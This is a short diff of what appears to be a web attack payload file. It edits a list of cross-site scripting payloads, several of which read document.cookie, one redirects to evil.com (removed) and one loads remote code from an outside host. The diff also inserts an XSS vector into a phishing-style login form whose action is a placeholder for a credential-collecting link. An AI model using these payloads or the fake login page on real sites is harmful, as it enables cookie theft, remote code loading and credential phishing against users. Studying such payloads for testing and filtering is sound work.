@@ -27,18 +27,13 @@ info:
 <img src=x onerror=alert(1)>
 javascript:var{a:onerror}={a:alert};throw%20document.cookie
 <img src=x onerror=prompt(8);>
-admin";alert(1)//
 rootxravi<onmouseover=alert(document.cookie)//>rootxravi
-rootxravi<onmouseover=location='https://evil.com'//>rootxravi
 rootxravi<onmouseover=alert(1)//>
 <img src=x onError=prompt(document.cookie)>
 <img src=x onerroR=alert(document.domain)>
 Defaulttest><iframe src=javascript:al\u{65}rt(1)>
-<img src="" onerror="alert('XSS Time!'+document.cookie)">
-<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
 <dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
 <Img Src=//X55.is OnLoad=import(src)>
-<iframe srcdoc="<img src=x onerror=alert(document.cookie)>"></iframe>
 <!--><Svg%20OnLoad=_=confirm,_(document.domain)<!--
 alert;[alert][0].call(this,1)
 
@@ -49,6 +44,7 @@ alert;[alert][0].call(this,1)
     <form action="#YOURLINKTOGETCREDENTIALS" method="post" class="form-signin">
       <div class="form-group" style="margin-bottom: 15px;">
         <label for="username" style="font-size: 14px; color: #555; display: block; margin-bottom: 5px;">Username</label>
+        <input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
         <input type="text" name="username" size="20" style="width: 100%; padding: 10px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px;">
       </div>
       <div class="form-group" style="margin-bottom: 15px;">
